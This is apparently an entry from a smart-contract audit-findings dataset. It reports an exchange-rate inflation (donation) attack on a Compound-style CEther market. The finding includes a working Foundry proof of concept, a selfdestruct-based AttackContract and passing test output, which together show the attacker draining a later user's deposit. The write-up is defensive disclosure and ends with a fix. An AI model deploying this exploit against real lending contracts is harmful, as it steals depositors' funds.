# [M] The attacker transferred tokens, polluted the

## Summary
Severity: Medium
Contest weight: 0.7602
Dataset id: 22994
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The attacker transferred tokens, polluted the contract balance, and maliciously exaggerated the return value of CToken::exchangeRateStoredInternal() to gain benefits. CToken::exchangeRateStoredInternal() calls getCashPrior() to obtain totalCash, which is used to calculate exchangeRate. The conclusion is that the larger the return value of getCashPrior(), the larger the value of exchangeRate.

```solidity
function exchangeRateStoredInternal() virtual internal view returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        /*
        * If there are no tokens minted:
        *
        exchangeRate = initialExchangeRate
        */
        return initialExchangeRateMantissa;
    } else {
        /*
        * Otherwise:
        *
        exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
        */
        uint totalCash = getCashPrior();
        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;
        return exchangeRate;
    }
}
```
Check CEther::getCashPrior() and CErc20::getCashPrior(), both return the balance in the current contract in the form of balance.

```solidity
// CEther::getCashPrior()
/**
* @notice Gets balance of this contract in terms of Ether, before this message
* @dev This excludes the value of the current message, if any
* @return The quantity of Ether owned by this contract
*/
function getCashPrior() override internal view returns (uint) {
    return address(this).balance - msg.value;
}
```

```solidity
// CErc20::getCashPrior()
/**
* @notice Gets balance of this contract in terms of the underlying
* @dev This excludes the value of the current message, if any
* @return The quantity of underlying tokens owned by this contract
*/
function getCashPrior() virtual override internal view returns (uint) {
    EIP20Interface token = EIP20Interface(underlying);
    return token.balanceOf(address(this));
}
```
An attacker only needs to transfer tokens to maliciously inflate the return value of the CToken::exchangeRateStoredInternal() function.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import {Test, console} from "forge-std/Test.sol";
import {CEther} from "contracts/CEther.sol";
import {ComptrollerInterface} from "contracts/CTokenInterfaces.sol";
import {InterestRateModel} from "contracts/InterestRateModel.sol";
import {Comptroller} from "contracts/Comptroller.sol";
import {JumpRateModel} from "contracts/JumpRateModel.sol";
contract Poc is Test {
    CEther public cEther;
    Comptroller public comptroller;
    JumpRateModel public jumpRateModel;
    address public admin = makeAddr("admin");
    address public user = makeAddr("user");
    address public attacker = makeAddr("attacker");
    AttackContract public attackContract;

    function setUp() public {
        jumpRateModel = new JumpRateModel(1e18,1e18,1e18,1e18);
        comptroller = new Comptroller();
        cEther = new CEther(comptroller,jumpRateModel,1e18,"dIOTANative","dIOTAN cative",18,payable(admin));
        assertEq(cEther.admin(),admin);
        // _supportMarket()
        comptroller._supportMarket(cEther);
    }

    function testPollutionExchangeRate() public {
        // The cEther contract eth balance is 0
        assertEq(address(cEther).balance,0);
        // deploy attack contract
        attackContract = new AttackContract(address(cEther));
        vm.deal(address(attackContract), 1 ether);
        vm.deal(attacker, 1);
        // attacker call mint
        vm.prank(attacker);
        cEther.mint{value:1}();
        // The cEther contract eth balance == 1 and totalSupply == 1
        assertEq(address(cEther).balance,1);
        assertEq(cEther.totalSupply(),1);
        // The attack Contract self-destructs the contract to transfer eth to the cEther contract
        attackContract.attack();
        // The cEther contract eth balance is 1 ether + 1 and totalSupply == 1
        assertEq(address(cEther).balance,1 ether + 1);
        assertEq(cEther.totalSupply(),1);
        // After that, other users who call mint() with an amount less than or equal to 1 ether will get 0 corresponding shares
        vm.deal(user, 1 ether);
        vm.prank(user);
        cEther.mint{value:1 ether}();
        // user gets token == 0, cEther contract current eth balance == 2 ether + 1
        assertEq(cEther.balanceOf(user),0);
        assertEq(address(cEther).balance, 2 ether + 1);
        // attacker calls redeem()
        vm.prank(attacker);
        cEther.redeem(1);
        // The attacker obtains all ETH in the cEther contract, balance == 2 ether + 1
        assertEq(attacker.balance, 2 ether + 1);
    }
}
contract AttackContract {
    address target;
    constructor(address _target) {
        target = _target;
    }
    function attack() public payable {
        address payable addr = payable(address(target));
        selfdestruct(addr);
    }
}
// [PASS] testPollutionExchangeRate() (gas: 301904)
// Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.33ms (361.36s CPU time)
```

## Recommendation
It is recommended to save the asset balance in the contract as a variable to prevent malicious users from easily modifying it by transferring tokens.
